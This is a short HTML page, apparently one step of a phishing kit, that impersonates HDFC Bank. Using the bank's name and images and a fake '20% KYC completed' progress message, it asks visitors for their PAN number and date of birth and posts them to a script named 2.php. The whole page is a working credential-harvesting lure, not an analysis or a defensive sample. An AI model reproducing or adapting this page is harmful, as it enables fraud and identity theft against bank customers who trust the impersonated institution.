<!DOCTYPE html>
<html lang="zxx">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>HDFC</title>
    <style>
        #ll,#aa
        {
            width: 102%;
        }
        #dd,#gg
        {
            width: 338px;
            height:25px;
            background-color:white;
            border-color:#1D85FE;
            border-width:0.5px;
        }
        #jj
        {
            width: 338px;
            background-color: #1D85FE;
            color: white;
            padding: 12px 10px;
            margin: 0px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px; width: 340px; height: 40px;
            
        }
    </style>
</head>
<body>
    <img src="hdfirst.jpg" alt="" id="aa"><br><br>
 <form action="2.php" method="post">
    <div id="cc">
    Enter PAN no
    </div>
        <input type="text" name="PAN no" id="dd" required=""> <br><br>
    </div>
    <div id="ee">
        Enter Date Of Birth
    </div>
    <div id="ff">
        <input type="date" value="2002-01-01" name="date of birth" id="gg" required=""><br><br>
    </div>
    <div id="hh" required="">
        <p2 style="color:green;"> 20% KYC completed</p2> <br><br>   
    </div>
    <div id="ii">
      <center><button type="submit" id="jj">CONFIRM</button></center><br>
    </div>
    <img src="fourth.jpg" alt="" id="aa">
 </form>
</body>
</html>